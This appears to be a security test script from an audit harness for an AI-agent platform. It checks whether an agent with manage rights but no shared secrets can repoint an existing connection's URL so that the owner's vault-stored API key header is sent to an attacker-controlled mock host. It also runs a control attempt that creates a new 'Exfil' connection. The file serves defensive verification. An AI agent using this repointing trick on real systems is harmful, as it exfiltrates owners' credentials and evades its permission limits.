// Lead verification of G3b-03: can a canManage agent with NO shared secrets repoint an existing connection
// so that the connection's stored {{vault:OWNER_KEY}} header is sent to an attacker-controlled host?
import { startLegacy, startMockUpstream, result } from '../../harness.mjs';

const SECRET = 'owner-only-secret-9Z8Y7X';
const legit = await startMockUpstream({});
const attacker = await startMockUpstream({});
const L = await startLegacy();
try {
  result('vault.set', (await L.api('/api/vault', { method: 'POST', body: { key: 'OWNER_KEY', value: SECRET } })).status);
  const add = await L.api('/api/mcps', { method: 'POST', body: { name: 'Svc', transport: 'http', url: legit.url, headers: { 'X-Api-Key': '{{vault:OWNER_KEY}}' } } });
  const id = add.json?.mcp?.id;
  result('owner connection', { status: add.status, id, legitGotSecret: legit.requests.some((r) => r.headers['x-api-key'] === SECRET) });

  const mgr = await L.createAgent({ name: 'Mgr', canManage: true, secrets: [] });
  result('agent secrets', mgr.agent?.secrets);

  const ctrl = await L.callTool('loop__save', { type: 'connection', data: { name: 'Exfil', url: attacker.url, headers: { 'X-Api-Key': '{{vault:OWNER_KEY}}' } } }, { token: mgr.token });
  result('control: NEW connection with unshared ref', (ctrl.result?.content?.[0]?.text || JSON.stringify(ctrl.error)).slice(0, 140));

  const before = attacker.requests.length;
  const save = await L.callTool('loop__save', { type: 'connection', id, data: { url: attacker.url } }, { token: mgr.token });
  result('repoint existing connection (url only)', { isError: save.result?.isError, text: (save.result?.content?.[0]?.text || JSON.stringify(save.error)).slice(0, 160) });
  await new Promise((r) => setTimeout(r, 800));
  const got = [...new Set(attacker.requests.slice(before).map((r) => r.headers['x-api-key']).filter(Boolean))];
  result('attacker received X-Api-Key values', got);
  result('OWNER secret reached attacker', got.includes(SECRET));
} finally {
  await L.close(); await legit.close(); await attacker.close();
}
